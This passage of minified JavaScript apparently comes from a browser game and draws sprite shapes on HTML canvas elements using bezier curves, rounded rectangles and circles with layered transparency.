        a.bezierCurveTo(e * 73, e * 47, e * 69, e * 45, e * 67, e * 58);
        ye(a, undefined, i[2], e * 10);
        a.translate(3, e * 0);
        a.beginPath();
        a.lineCap = "round";
        a.lineJoin = "round";
        a.moveTo(e * 70, e * 17);
        a.bezierCurveTo(e * 83, e * 45, e * 76, e * 55, e * 70, e * 69);
        ye(a, undefined, i[2], e * 10);
        a.translate(3, e * 0);
        a.beginPath();
        a.lineCap = "round";
        a.lineJoin = "round";
        a.moveTo(e * 76, e * 8);
        a.bezierCurveTo(e * 88, e * 31, e * 89, e * 55, e * 76, e * 79);
        ye(a, undefined, i[2], e * 10);
      } else {
        if (t == 1) {
          a.beginPath();
          a.lineCap = "round";
          a.lineJoin = "round";
          a.moveTo(e * 108, e * 27);
          a.bezierCurveTo(e * 94, e * 45.5, e * 94, e * 45.5, e * 80, e * 64);
          a.closePath();
          ye(a, undefined, i[3], e * 18);
          a.beginPath();
          a.lineCap = "round";
          a.lineJoin = "round";
          a.moveTo(e * 79, e * 30);
          a.bezierCurveTo(e * 93, e * 47, e * 93, e * 47, e * 107, e * 64);
          a.closePath();
          ye(a, undefined, i[3], e * 18);
        } else {
          a.translate(0, e * -5);
          a.beginPath();
          a.lineCap = "round";
          a.lineJoin = "round";
          a.moveTo(e * 108, e * 27);
          a.bezierCurveTo(e * 94, e * 45.5, e * 94, e * 45.5, e * 80, e * 64);
          a.closePath();
          ye(a, undefined, i[0], e * 7);
          a.beginPath();
          a.lineCap = "round";
          a.lineJoin = "round";
          a.moveTo(e * 79, e * 30);
          a.bezierCurveTo(e * 93, e * 47, e * 93, e * 47, e * 107, e * 64);
          a.closePath();
          ye(a, undefined, i[0], e * 7);
          a.translate(0, e * 5);
        }
        a.beginPath();
        a.lineCap = "round";
        a.lineJoin = "round";
        a.moveTo(e * 108, e * 27);
        a.bezierCurveTo(e * 94, e * 45.5, e * 94, e * 45.5, e * 80, e * 64);
        a.closePath();
        ye(a, undefined, i[2], e * 7);
        a.beginPath();
        a.lineCap = "round";
        a.lineJoin = "round";
        a.moveTo(e * 79, e * 30);
        a.bezierCurveTo(e * 93, e * 47, e * 93, e * 47, e * 107, e * 64);
        a.closePath();
        ye(a, undefined, i[2], e * 7);
      }
      return n;
    }
    function Gi(e, i, t) {
      var r = document.createElement("canvas");
      var n = r.getContext("2d");
      var a = (d = e * 450) / 2;
      var o = (h = e * 145) / 2;
      var s = e * 10;
      var _ = e * 300;
      var E = e * 30;
      var T = _ / 2;
      var A = E / 2;
      if (t) {
        var d = e * 145;
        var h = e * 450;
        r.width = d;
        r.height = h;
        n.rotate(Math.PI / 2);
        n.save();
        n.globalAlpha = 0.5;
        Be(n, e * 100, e * -110, _, E, s);
        ye(n, i[0]);
        n.translate(e * 178, e * -98);
        Be(n, -T, -A - e * 6, e * 100, e * 100, s);
        ye(n, i[0]);
        n.translate(e * -50, e * 5);
        Be(n, e * 220, e * -15, e * 90, e * 90, s);
        ye(n, i[0]);
        n.restore();
        n.save();
        n.globalAlpha = 1;
        n.translate(e * 250, e * -63);
        Be(n, -T - e * 20, -A, _, E, s);
        ye(n, i[1], i[2], 4);
        n.translate(e * -70, e * -40);
        Be(n, -T - e * 20, -A, e * 100, e * 100, s);
        ye(n, i[3], i[4], 4);
        n.translate(e * -70, e * 15);
        Be(n, e * 220, e * -22, e * 90, e * 90, s);
        ye(n, i[3], i[4], 4);
        Be(n, e * 230, e * -12, e * 55, e * 55, s);
        ye(n, i[5]);
        n.translate(e * -70, 0);
        Be(n, e * -15, e * -2, e * 60, e * 60, s);
        ye(n, i[5]);
        n.restore();
      } else {
        r.width = d;
        r.height = h;
        n.save();
        n.globalAlpha = 0.5;
        n.translate(a, o + e * 10);
        Be(n, -T, -A, _, E, s);
        ye(n, i[0]);
        n.translate(e * -65, e * -25);
        Be(n, -T, -A - e * 6, e * 100, e * 100, e * 15);
        ye(n, i[0]);
        n.translate(e * -35, e * -5);
        Be(n, e * 220, e * -15, e * 90, e * 90, e * 15);
        ye(n, i[0]);
        n.restore();
        n.save();
        n.globalAlpha = 1;
        n.translate(e * 240, e * 70);
        Be(n, -T, -A, _, E, s);
        ye(n, i[1], i[2], 4);
        n.translate(e * -60, e * -40);
        Be(n, -T - e * 20, -A, e * 100, e * 100, e * 15);
        ye(n, i[3], i[4], 4);
        n.translate(e * -55, e * 10);
        Be(n, e * 220, e * -22, e * 90, e * 90, e * 15);
        ye(n, i[3], i[4], 4);
        Be(n, e * 240, e * -12, e * 55, e * 55, e * 12);
        ye(n, i[5]);
        n.translate(e * 45, e * 0);
        Be(n, e * -145, e * -2, e * 60, e * 60, e * 12);
        ye(n, i[5]);
        n.restore();
      }
      return r;
    }
    function fi(e, i) {
      var t = document.createElement("canvas");
      var r = t.getContext("2d");
      var n = Math.max(i.width, e.width);
      var a = Math.max(i.height, e.height);
      t.width = n;
      t.height = a;
      r.drawImage(e, (n - e.width) / 2, (a - e.height) / 2);
      r.drawImage(i, (n - i.width) / 2, (a - i.height) / 2);
      return t;
    }
    function Hi(e, i, t) {
      var r = document.createElement("canvas");
      var n = r.getContext("2d");
      var a = e * 105;
      var o = e * 125;
      var s = e * 4;
      var _ = e * 10;
      var E = e * 5;
      var T = e * 10;
      var A = e * 110;
      var d = T / 2;
      var h = A / 2;
      r.width = a;
      r.height = o;
      n.save();
      n.globalAlpha = i ? 0.5 : 1;
      n.translate(a / 2 + e * 8, o / 2 + E);
      Be(n, -d, -h, T, A, _);
      ye(n, i ? t[0] : t[1]);
      n.translate(e * -130 + E, e * -128 + E);
      n.beginPath();
      n.bezierCurveTo(e * 159, e * 93, e * 156, e * 99, e * 154, e * 102);
      n.bezierCurveTo(e * 128, e * 92, e * 90, e * 93, e * 72, e * 96);
      n.bezierCurveTo(e * 68, e * 84, e * 143, e * 73, e * 162, e * 86);
      n.closePath();
      ye(n, t[2]);
      n.restore();
      n.translate(a / 2 + 8, o / 2);
      n.globalAlpha = 1;
      Be(n, -d, -h, T, A, _);
      ye(n, t[3], t[4], s);
      n.translate(e * -130, e * -125);
      n.beginPath();
      n.bezierCurveTo(e * 159, e * 93, e * 156, e * 99, e * 154, e * 102);
      n.bezierCurveTo(e * 128, e * 92, e * 90, e * 93, e * 72, e * 96);
      n.bezierCurveTo(e * 68, e * 84, e * 143, e * 73, e * 162, e * 86);
      n.closePath();
      ye(n, t[5], t[6], s);
      return r;
    }
    function Pi(e, i, t) {
      var r = document.createElement("canvas");
      var n = r.getContext("2d");
      r.width = e * 170;
      r.height = e * 469;
      n.globalAlpha = i ? 0.5 : 1;
      n.translate(e * 20, e * 20);
      n.beginPath();
      n.lineCap = "round";
      n.lineJoin = "round";
      n.moveTo(e * 88, e * 30);
      n.bezierCurveTo(e * 96, e * 49.5, e * 96, e * 49.5, e * 104, e * 69);
      n.bezierCurveTo(e * 105.5, e * 41.5, e * 105.5, e * 41.5, e * 107, e * 14);
      n.bezierCurveTo(e * 114, e * 9.5, e * 114, e * 9.5, e * 121, e * 5);
      n.bezierCurveTo(e * 135.5, e * 27.5, e * 135.5, e * 27.5, e * 150, e * 50);
      n.bezierCurveTo(e * 110.5, e * 286, e * 110.5, e * 286, e * 103, e * 331);
      n.bezierCurveTo(e * 69.5, e * 325, e * 69.5, e * 325, e * 36, e * 319);
      n.bezierCurveTo(e * 56.5, e * 180, e * 56.5, e * 180, e * 77, e * 41);
      n.closePath();
      ye(n, t[0]);
      n.beginPath();
      n.lineCap = "round";
      n.lineJoin = "round";
      n.moveTo(e * 118, e * 31);
      n.bezierCurveTo(e * 125, e * 43, e * 125, e * 43, e * 132, e * 55);
      n.bezierCurveTo(e * 109.5, e * 185.5, e * 109.5, e * 185.5, e * 87, e * 316);
      n.bezierCurveTo(e * 72, e * 313.5, e * 72, e * 313.5, e * 57, e * 311);
      n.bezierCurveTo(e * 76.5, e * 181, e * 76.5, e * 181, e * 96, e * 51);
      n.closePath();
      ye(n, t[0]);
      n.beginPath();
      n.lineCap = "round";
      n.lineJoin = "round";
      n.moveTo(e * 56, e * 328);
      n.bezierCurveTo(e * 47, e * 385.5, e * 47, e * 385.5, e * 38, e * 443);
      n.bezierCurveTo(e * 52, e * 446, e * 52, e * 446, e * 66, e * 449);
      n.bezierCurveTo(e * 76.5, e * 388.5, e * 76.5, e * 388.5, e * 87, e * 328);
      n.closePath();
      ye(n, t[0]);
      n.beginPath();
      n.lineCap = "round";
      n.lineJoin = "round";
      n.moveTo(e * 74, e * 302);
      n.bezierCurveTo(e * 104, e * 316.5, e * 104, e * 316.5, e * 134, e * 331);
      n.bezierCurveTo(e * 133, e * 341, e * 133, e * 341, e * 132, e * 351);
      n.bezierCurveTo(e * 69.5, e * 342, e * 69.5, e * 342, e * 7, e * 333);
      n.bezierCurveTo(e * 8, e * 323, e * 8, e * 323, e * 9, e * 313);
      n.closePath();
      ye(n, t[0]);
      n.save();
      n.translate(e * 51.5, e * 440.5);
      n.rotate(0.2);
      Be(n, e * -20.5, e * -18.5, e * 41, e * 37, e * 10);
      n.restore();
      ye(n, t[0]);
      n.beginPath();
      n.lineCap = "round";
      n.lineJoin = "round";
      n.moveTo(e * 73, e * 316);
      n.bezierCurveTo(e * 90, e * 324.5, e * 90, e * 324.5, e * 107, e * 333);
      n.bezierCurveTo(e * 70, e * 327.5, e * 70, e * 327.5, e * 33, e * 322);
      n.closePath();
      ye(n, t[0]);
      n.globalAlpha = 1;
      n.translate(e * -20, e * -20);
      n.beginPath();
      n.lineCap = "round";
      n.lineJoin = "round";
      n.moveTo(e * 88, e * 30);
      n.bezierCurveTo(e * 96, e * 49.5, e * 96, e * 49.5, e * 104, e * 69);
      n.bezierCurveTo(e * 105.5, e * 41.5, e * 105.5, e * 41.5, e * 107, e * 14);
      n.bezierCurveTo(e * 114, e * 9.5, e * 114, e * 9.5, e * 121, e * 5);
      n.bezierCurveTo(e * 135.5, e * 27.5, e * 135.5, e * 27.5, e * 150, e * 50);
      n.bezierCurveTo(e * 110.5, e * 286, e * 110.5, e * 286, e * 103, e * 331);
      n.bezierCurveTo(e * 69.5, e * 325, e * 69.5, e * 325, e * 36, e * 319);
      n.bezierCurveTo(e * 56.5, e * 180, e * 56.5, e * 180, e * 77, e * 41);
      n.closePath();
      ye(n, t[1], t[2], e * 7);
      n.beginPath();
      n.lineCap = "round";
      n.lineJoin = "round";
      n.moveTo(e * 118, e * 31);
      n.bezierCurveTo(e * 125, e * 43, e * 125, e * 43, e * 132, e * 55);
      n.bezierCurveTo(e * 109.5, e * 185.5, e * 109.5, e * 185.5, e * 87, e * 316);
      n.bezierCurveTo(e * 72, e * 313.5, e * 72, e * 313.5, e * 57, e * 311);
      n.bezierCurveTo(e * 76.5, e * 181, e * 76.5, e * 181, e * 96, e * 51);
      n.closePath();
      ye(n, t[3]);
      n.beginPath();
      n.lineCap = "round";
      n.lineJoin = "round";
      n.moveTo(e * 88, e * 30);
      n.bezierCurveTo(e * 96, e * 49.5, e * 96, e * 49.5, e * 104, e * 69);
      n.bezierCurveTo(e * 105.5, e * 41.5, e * 105.5, e * 41.5, e * 107, e * 14);
      n.bezierCurveTo(e * 114, e * 9.5, e * 114, e * 9.5, e * 121, e * 5);
      n.bezierCurveTo(e * 135.5, e * 27.5, e * 135.5, e * 27.5, e * 150, e * 50);
      n.bezierCurveTo(e * 110.5, e * 286, e * 110.5, e * 286, e * 103, e * 331);
      n.bezierCurveTo(e * 69.5, e * 325, e * 69.5, e * 325, e * 36, e * 319);
      n.bezierCurveTo(e * 56.5, e * 180, e * 56.5, e * 180, e * 77, e * 41);
      n.closePath();
      ye(n, undefined, t[2], e * 7);
      n.beginPath();
      n.lineCap = "round";
      n.lineJoin = "round";
      n.moveTo(e * 56, e * 328);
      n.bezierCurveTo(e * 47, e * 385.5, e * 47, e * 385.5, e * 38, e * 443);
      n.bezierCurveTo(e * 52, e * 446, e * 52, e * 446, e * 66, e * 449);
      n.bezierCurveTo(e * 76.5, e * 388.5, e * 76.5, e * 388.5, e * 87, e * 328);
      n.closePath();
      ye(n, t[4], t[5], e * 7);
      n.beginPath();
      n.lineCap = "round";
      n.lineJoin = "round";
      n.moveTo(e * 74, e * 302);
      n.bezierCurveTo(e * 104, e * 316.5, e * 104, e * 316.5, e * 134, e * 331);
      n.bezierCurveTo(e * 133, e * 341, e * 133, e * 341, e * 132, e * 351);
      n.bezierCurveTo(e * 69.5, e * 342, e * 69.5, e * 342, e * 7, e * 333);
      n.bezierCurveTo(e * 8, e * 323, e * 8, e * 323, e * 9, e * 313);
      n.closePath();
      ye(n, t[4], t[5], e * 7);
      n.save();
      n.translate(e * 51.5, e * 440.5);
      n.rotate(0.2);
      Be(n, e * -20.5, e * -18.5, e * 41, e * 37, e * 10);
      n.restore();
      ye(n, t[4], t[5], e * 7);
      n.beginPath();
      n.lineCap = "round";
      n.lineJoin = "round";
      n.moveTo(e * 73, e * 316);
      n.bezierCurveTo(e * 90, e * 324.5, e * 90, e * 324.5, e * 107, e * 333);
      n.bezierCurveTo(e * 70, e * 327.5, e * 70, e * 327.5, e * 33, e * 322);
      n.closePath();
      ye(n, t[6]);
      return r;
    }
    function yi(e, i, t) {
      var r = document.createElement("canvas");
      var n = r.getContext("2d");
      r.width = e * 424;
      r.height = e * 788;
      n.translate(e * 25, e * 25);
      n.globalAlpha = i ? 0.5 : 1;
      n.save();
      n.translate(e * 193.5, e * 602.5);
      n.rotate(-0.12);
      Be(n, e * -26.5, e * -97.5, e * 53, e * 195, e * 25);
      n.restore();
      ye(n, t[0]);
      n.beginPath();
      n.lineCap = "round";
      n.lineJoin = "round";
      n.moveTo(e * 137, e * 519);
      n.bezierCurveTo(e * 182, e * 513, e * 182, e * 513, e * 227, e * 507);
      n.bezierCurveTo(e * 214, e * 417, e * 189, e * 304, e * 221, e * 180);
      n.bezierCurveTo(e * 191, e * 126, e * 192, e * 105, e * 198, e * 64);
      n.bezierCurveTo(e * 123, e * 102, e * 99, e * 285, e * 137, e * 517);
      n.closePath();
      ye(n, t[0]);
      n.beginPath();
      n.lineCap = "round";
      n.lineJoin = "round";
      n.moveTo(e * 175, e * 119);
      n.bezierCurveTo(e * 176, e * 142, e * 184, e * 165, e * 197, e * 183);
      n.bezierCurveTo(e * 167, e * 325, e * 191, e * 405, e * 202, e * 502);
      n.bezierCurveTo(e * 180, e * 503, e * 180, e * 503, e * 158, e * 504);
      n.bezierCurveTo(e * 135, e * 396, e * 134, e * 185, e * 175, e * 119);
      n.closePath();
      ye(n, t[0]);
      n.beginPath();
      n.lineCap = "round";
      n.lineJoin = "round";
      n.moveTo(e * 110, e * 518);
      n.bezierCurveTo(e * 111.5, e * 533, e * 111.5, e * 533, e * 113, e * 548);
      n.bezierCurveTo(e * 162.5, e * 544, e * 162.5, e * 544, e * 212, e * 540);
      n.bezierCurveTo(e * 312, e * 535, e * 281, e * 665, e * 225, e * 665);
      n.bezierCurveTo(e * 227, e * 686.5, e * 227, e * 686.5, e * 229, e * 708);
      n.bezierCurveTo(e * 343, e * 684, e * 354, e * 496, e * 222, e * 498);
      n.bezierCurveTo(e * 165.5, e * 503, e * 165.5, e * 503, e * 109, e * 508);
      n.closePath();
      ye(n, t[0]);
      ze(n, e * 204, e * 693, e * 36.013886210738214);
      ye(n, t[0]);
      ze(n, e * 105, e * 518, e * 30);
      ye(n, t[0]);
      n.beginPath();
      n.lineCap = "round";
      n.lineJoin = "round";
      n.moveTo(e * 171, e * 535);
      n.bezierCurveTo(e * 139.5, e * 537.5, e * 139.5, e * 537.5, e * 108, e * 540);
      n.bezierCurveTo(e * 110, e * 527.5, e * 110, e * 527.5, e * 112, e * 515);
      n.bezierCurveTo(e * 148, e * 513, e * 148, e * 513, e * 184, e * 511);
      n.closePath();
      ye(n, t[0]);
      n.beginPath();
      n.lineCap = "round";
      n.lineJoin = "round";
      n.moveTo(e * 244, e * 669);
      n.bezierCurveTo(e * 248.5, e * 680, e * 248.5, e * 680, e * 253, e * 691);
      n.bezierCurveTo(e * 239.5, e * 697, e * 239.5, e * 697, e * 226, e * 703);
      n.bezierCurveTo(e * 223, e * 691.5, e * 223, e * 691.5, e * 220, e * 680);
      n.closePath();
      ye(n, t[0]);
      n.translate(e * -25, e * -25);
      n.globalAlpha = 1;
      n.save();
      n.translate(e * 193.5, e * 602.5);
      n.rotate(-0.12);
      Be(n, e * -26.5, e * -97.5, e * 53, e * 195, e * 25);
      n.restore();
      ye(n, t[1], t[2], e * 16);
      n.beginPath();
      n.lineCap = "round";
      n.lineJoin = "round";
      n.moveTo(e * 137, e * 519);
      n.bezierCurveTo(e * 182, e * 513, e * 182, e * 513, e * 227, e * 507);
      n.bezierCurveTo(e * 214, e * 417, e * 189, e * 304, e * 221, e * 180);
      n.bezierCurveTo(e * 191, e * 126, e * 192, e * 105, e * 198, e * 64);
      n.bezierCurveTo(e * 123, e * 102, e * 99, e * 285, e * 137, e * 517);
      n.closePath();
      ye(n, t[3], t[4], e * 16);
      n.beginPath();
      n.lineCap = "round";
      n.lineJoin = "round";
      n.moveTo(e * 175, e * 119);
      n.bezierCurveTo(e * 176, e * 142, e * 184, e * 165, e * 197, e * 183);
      n.bezierCurveTo(e * 167, e * 325, e * 191, e * 405, e * 202, e * 502);
      n.bezierCurveTo(e * 180, e * 503, e * 180, e * 503, e * 158, e * 504);
      n.bezierCurveTo(e * 135, e * 396, e * 134, e * 185, e * 175, e * 119);
      n.closePath();
      ye(n, t[5]);
      n.beginPath();
      n.lineCap = "round";
      n.lineJoin = "round";
      n.moveTo(e * 110, e * 518);
      n.bezierCurveTo(e * 111.5, e * 533, e * 111.5, e * 533, e * 113, e * 548);
      n.bezierCurveTo(e * 162.5, e * 544, e * 162.5, e * 544, e * 212, e * 540);
      n.bezierCurveTo(e * 312, e * 535, e * 281, e * 665, e * 225, e * 665);
      n.bezierCurveTo(e * 227, e * 686.5, e * 227, e * 686.5, e * 229, e * 708);
      n.bezierCurveTo(e * 343, e * 684, e * 354, e * 496, e * 222, e * 498);
      n.bezierCurveTo(e * 165.5, e * 503, e * 165.5, e * 503, e * 109, e * 508);
      n.closePath();
      ye(n, t[6], t[4], e * 16);
      ze(n, e * 204, e * 693, e * 36.013886210738214);
      ye(n, t[6], t[4], e * 16);
      ze(n, e * 105, e * 518, e * 30);
      ye(n, t[6], t[4], e * 16);
      n.beginPath();
      n.lineCap = "round";
      n.lineJoin = "round";
      n.moveTo(e * 171, e * 535);
      n.bezierCurveTo(e * 139.5, e * 537.5, e * 139.5, e * 537.5, e * 108, e * 540);
      n.bezierCurveTo(e * 110, e * 527.5, e * 110, e * 527.5, e * 112, e * 515);
      n.bezierCurveTo(e * 148, e * 513, e * 148, e * 513, e * 184, e * 511);
      n.closePath();
      ye(n, t[6]);
      n.beginPath();
      n.lineCap = "round";
      n.lineJoin = "round";
      n.moveTo(e * 244, e * 669);
      n.bezierCurveTo(e * 248.5, e * 680, e * 248.5, e * 680, e * 253, e * 691);
      n.bezierCurveTo(e * 239.5, e * 697, e * 239.5, e * 697, e * 226, e * 703);
      n.bezierCurveTo(e * 223, e * 691.5, e * 223, e * 691.5, e * 220, e * 680);
      n.closePath();
      ye(n, t[6]);
      ze(n, e * 204, e * 693, e * 17.029386365926403);
      ye(n, t[7]);
      ze(n, e * 106, e * 518, e * 12);
      ye(n, t[7]);
      return r;
    }
    function Bi(e, i, t) {
      var r = document.createElement("canvas");
      var n = r.getContext("2d");
      r.width = e * 100;
      r.height = e * 250;
      n.translate(e * -135, e * -75);
      n.globalAlpha = i ? 0.8 : 1;
      n.beginPath();
      n.lineCap = "round";
      n.lineJoin = "round";
      n.moveTo(e * 178.5, e * 238.03125);
      n.bezierCurveTo(e * 177, e * 175.03125, e * 177, e * 175.03125, e * 175.5, e * 112.03125);
      n.bezierCurveTo(e * 184.5, e * 100.53125, e * 184.5, e * 100.53125, e * 193.5, e * 89.03125);
      n.bezierCurveTo(e * 202, e * 100.03125, e * 202, e * 100.03125, e * 210.5, e * 111.03125);
      n.bezierCurveTo(e * 209.5, e * 174.03125, e * 209.5, e * 174.03125, e * 208.5, e * 237.03125);
      n.closePath();
      ye(n, t[0]);
      n.beginPath();
      n.lineCap = "round";
      n.lineJoin = "round";
      n.moveTo(e * 155.5, e * 239.03125);
      n.bezierCurveTo(e * 194, e * 238.53125, e * 194, e * 238.53125, e * 232.5, e * 238.03125);
      n.bezierCurveTo(e * 232.5, e * 243.03125, e * 232.5, e * 243.03125, e * 232.5, e * 248.03125);
      n.bezierCurveTo(e * 194, e * 248.53125, e * 194, e * 248.53125, e * 155.5, e * 249.03125);
      n.closePath();
      ye(n, t[0]);
      ze(n, e * 160.5, e * 243.03125, e * 7);
      ye(n, t[0]);
      ze(n, e * 227.5, e * 242.03125, e * 7);
      ye(n, t[0]);
      n.beginPath();
      n.lineCap = "round";
      n.lineJoin = "round";
      n.moveTo(e * 185.5, e * 253.03125);
      n.bezierCurveTo(e * 193.5, e * 253.03125, e * 193.5, e * 253.03125, e * 201.5, e * 253.03125);
      n.bezierCurveTo(e * 201.5, e * 276.03125, e * 201.5, e * 276.03125, e * 201.5, e * 299.03125);
      n.bezierCurveTo(e * 194.5, e * 299.03125, e * 194.5, e * 299.03125, e * 187.5, e * 299.03125);
      n.closePath();
      ye(n, t[0], t[0], e * 5);
      ze(n, e * 194, e * 298, e * 9);
      ye(n, t[0], t[0], e * 5);
      n.globalAlpha = 1;
      n.translate(e * -10, e * 10);
      n.beginPath();
      n.lineCap = "round";
      n.lineJoin = "round";
      n.moveTo(e * 178.5, e * 238.03125);
      n.bezierCurveTo(e * 177, e * 175.03125, e * 177, e * 175.03125, e * 175.5, e * 112.03125);
      n.bezierCurveTo(e * 184.5, e * 100.53125, e * 184.5, e * 100.53125, e * 193.5, e * 89.03125);
      n.bezierCurveTo(e * 202, e * 100.03125, e * 202, e * 100.03125, e * 210.5, e * 111.03125);
      n.bezierCurveTo(e * 209.5, e * 174.03125, e * 209.5, e * 174.03125, e * 208.5, e * 237.03125);
      n.closePath();
      ye(n, t[3], t[4], e * 5);
      n.beginPath();
      n.lineCap = "round";
      n.lineJoin = "round";
      n.moveTo(e * 155.5, e * 239.03125);
      n.bezierCurveTo(e * 194, e * 238.53125, e * 194, e * 238.53125, e * 232.5, e * 238.03125);
      n.bezierCurveTo(e * 232.5, e * 243.03125, e * 232.5, e * 243.03125, e * 232.5, e * 248.03125);
      n.bezierCurveTo(e * 194, e * 248.53125, e * 194, e * 248.53125, e * 155.5, e * 249.03125);
      n.closePath();
      ye(n, t[1], t[2], e * 5);
      ze(n, e * 160.5, e * 243.03125, e * 7);
      ye(n, t[1], t[2], e * 5);
      ze(n, e * 227.5, e * 242.03125, e * 7);
      ye(n, t[1], t[2], e * 5);
      n.beginPath();
      n.lineCap = "round";
      n.lineJoin = "round";
      n.moveTo(e * 185.5, e * 253.03125);
      n.bezierCurveTo(e * 193.5, e * 253.03125, e * 193.5, e * 253.03125, e * 201.5, e * 253.03125);
      n.bezierCurveTo(e * 201.5, e * 276.03125, e * 201.5, e * 276.03125, e * 201.5, e * 299.03125);
      n.bezierCurveTo(e * 194.5, e * 299.03125, e * 194.5, e * 299.03125, e * 187.5, e * 299.03125);
      n.closePath();
      ye(n, t[1], t[2], e * 7);
      ze(n, e * 194, e * 298, e * 9);
      ye(n, t[1], t[2], e * 7);
      return r;
    }
    function zi(e, i, t) {
      var r = document.createElement("canvas");
      var n = r.getContext("2d");
      r.width = e * 290;
      r.height = e * 525;
      n.globalAlpha = i ? 0.5 : 1;
      n.translate(e * 20, e * 20);
      n.beginPath();
      n.lineCap = "round";
      n.lineJoin = "round";
      n.moveTo(e * 111, e * 351);
      n.bezierCurveTo(e * 129, e * 218, e * 129, e * 218, e * 147, e * 85);
      n.bezierCurveTo(e * 167, e * 65.5, e * 167, e * 65.5, e * 187, e * 46);
      n.bezierCurveTo(e * 201.5, e * 70.5, e * 201.5, e * 70.5, e * 216, e * 95);
      n.bezierCurveTo(e * 194.5, e * 227.5, e * 194.5, e * 227.5, e * 173, e * 360);
      n.closePath();
      ye(n, t[0]);
      n.save();
      n.translate(e * 131, e * 425.5);
      n.rotate(0.16);
      Be(n, e * -14, e * -56.5, e * 28, e * 113, e * 8);
      n.restore();
      ye(n, t[0]);
      ze(n, e * 122, e * 480, e * 18.439088914585774);
      ye(n, t[0]);
      n.beginPath();
      n.lineCap = "round";
      n.lineJoin = "round";
      n.moveTo(e * 79, e * 371);
      n.bezierCurveTo(e * 131, e * 373, e * 145, e * 378, e * 197, e * 388);
      n.bezierCurveTo(e * 205, e * 382.5, e * 205, e * 382.5, e * 213, e * 377);
      n.bezierCurveTo(e * 167, e * 352, e * 117, e * 345, e * 69, e * 355);
      n.closePath();
      ye(n, t[0]);
      n.globalAlpha = 1;
      n.translate(e * -20, e * -20);
      n.beginPath();
      n.lineCap = "round";
      n.lineJoin = "round";
      n.moveTo(e * 111, e * 351);
      n.bezierCurveTo(e * 129, e * 218, e * 129, e * 218, e * 147, e * 85);
      n.bezierCurveTo(e * 167, e * 65.5, e * 167, e * 65.5, e * 187, e * 46);
      n.bezierCurveTo(e * 201.5, e * 70.5, e * 201.5, e * 70.5, e * 216, e * 95);
      n.bezierCurveTo(e * 194.5, e * 227.5, e * 194.5, e * 227.5, e * 173, e * 360);
      n.closePath();
      ye(n, t[1], t[2], e * 12.5);
      n.save();
      n.translate(e * 131, e * 425.5);
      n.rotate(0.16);
      Be(n, e * -14, e * -56.5, e * 28, e * 113, e * 8);
      n.restore();
      ye(n, t[4], t[5], e * 12.5);
      ze(n, e * 122, e * 480, e * 18.439088914585774);
      ye(n, t[4], t[5], e * 12.5);
      n.beginPath();
      n.lineCap = "round";
      n.lineJoin = "round";
      n.moveTo(e * 79, e * 371);
      n.bezierCurveTo(e * 131, e * 373, e * 145, e * 378, e * 197, e * 388);
      n.bezierCurveTo(e * 205, e * 382.5, e * 205, e * 382.5, e * 213, e * 377);
      n.bezierCurveTo(e * 167, e * 352, e * 117, e * 345, e * 69, e * 355);
      n.closePath();
      ye(n, t[4], t[5], e * 12.5);
      n.beginPath();
      n.lineCap = "round";
      n.lineJoin = "round";
      n.moveTo(e * 128, e * 345);
      n.bezierCurveTo(e * 142, e * 345, e * 147, e * 346, e * 158, e * 349);
      n.bezierCurveTo(e * 177.5, e * 224.5, e * 177.5, e * 224.5, e * 197, e * 100);
      n.bezierCurveTo(e * 190.5, e * 84.5, e * 190.5, e * 84.5, e * 184, e * 69);
      n.bezierCurveTo(e * 173.5, e * 82, e * 173.5, e * 82, e * 163, e * 95);
      n.closePath();
      ye(n, t[3]);
      return r;
    }
    function Wi(e, i, t, r) {
      var n = document.createElement("canvas");
      var a = n.getContext("2d");
      n.width = e * 283;
      n.height = e * 224;
      a.translate(0, e * 15);
      a.globalAlpha = 0.5;
      a.beginPath();
      a.lineCap = "round";
      a.lineJoin = "round";
      a.moveTo(e * 93, e * 55);
      a.bezierCurveTo(e * 127, e * 27, e * 195, e * 42, e * 213, e * 78);
      a.bezierCurveTo(e * 254, e * 134, e * 226, e * 198, e * 153, e * 197);
      a.bezierCurveTo(e * 59, e * 204, e * 56, e * 158, e * 51, e * 115);
      a.bezierCurveTo(e * 50, e * 93, e * 81, e * 62, e * 90, e * 57);
      a.closePath();
      ye(a, t[0]);
      a.beginPath();
      a.lineCap = "round";
      a.lineJoin = "round";
      a.moveTo(e * 100, e * 33);
      a.bezierCurveTo(e * 85, e * 62, e * 102, e * 66, e * 110, e * 83);
      a.closePath();
      ye(a, t[0]);
      a.beginPath();
      a.lineCap = "round";
      a.lineJoin = "round";
      a.moveTo(e * 181, e * 32);
      a.bezierCurveTo(e * 196, e * 62, e * 181, e * 68, e * 178, e * 69);
      ye(a, t[0]);
      a.beginPath();
      a.lineCap = "round";
      a.lineJoin = "round";
      a.moveTo(e * 225, e * 52);
      a.bezierCurveTo(e * 228, e * 78, e * 207, e * 77, e * 192, e * 88);
      ye(a, t[0]);
      a.beginPath();
      a.lineCap = "round";
      a.lineJoin = "round";
      a.moveTo(e * 34, e * 134);
      a.bezierCurveTo(e * 46, e * 111, e * 57, e * 111, e * 79, e * 109);
      ye(a, t[0]);
      a.beginPath();
      a.lineCap = "round";
      a.lineJoin = "round";
      a.moveTo(e * 249, e * 135);
      a.bezierCurveTo(e * 233, e * 107, e * 212, e * 112, e * 202, e * 115);
      ye(a, t[0]);
      a.beginPath();
      a.lineCap = "round";
      a.lineJoin = "round";
      a.moveTo(e * 56, e * 50);
      a.bezierCurveTo(e * 56, e * 82, e * 73, e * 82, e * 93, e * 89);
      ye(a, t[0]);
      a.translate(0, e * -15);
      a.globalAlpha = 1;
      a.beginPath();
      a.lineCap = "round";
      a.lineJoin = "round";
      a.moveTo(e * 100, e * 33);
      a.bezierCurveTo(e * 85, e * 62, e * 102, e * 66, e * 110, e * 83);
      ye(a, undefined, t[2], e * 40);
      a.beginPath();
      a.lineCap = "round";
      a.lineJoin = "round";
      a.moveTo(e * 181, e * 32);
      a.bezierCurveTo(e * 196, e * 62, e * 181, e * 68, e * 178, e * 69);
      ye(a, undefined, t[2], e * 40);
      a.beginPath();
      a.lineCap = "round";
      a.lineJoin = "round";
      a.moveTo(e * 225, e * 52);
      a.bezierCurveTo(e * 228, e * 78, e * 207, e * 77, e * 192, e * 88);
      ye(a, undefined, t[2], e * 40);
      a.beginPath();
      a.lineCap = "round";
      a.lineJoin = "round";
      a.moveTo(e * 34, e * 134);
      a.bezierCurveTo(e * 46, e * 111, e * 57, e * 111, e * 79, e * 109);
      ye(a, undefined, t[2], e * 40);
      a.beginPath();
      a.lineCap = "round";
      a.lineJoin = "round";
      a.moveTo(e * 249, e * 135);
